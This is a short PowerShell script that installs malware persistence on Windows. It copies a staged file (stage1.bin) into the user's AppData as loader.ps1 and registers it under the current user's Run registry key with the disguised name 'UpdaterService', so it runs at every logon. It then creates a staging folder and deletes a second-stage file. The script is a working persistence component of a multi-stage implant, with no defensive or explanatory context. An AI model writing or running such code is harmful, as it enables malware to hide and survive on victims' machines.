
[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = 'UpdaterService',
    [string]$PersistencePath = "$env:APPDATA\loader.ps1"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "C:\ProgramData\stage1.bin" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$TransferResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $TransferResult.$RegistryValue)

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
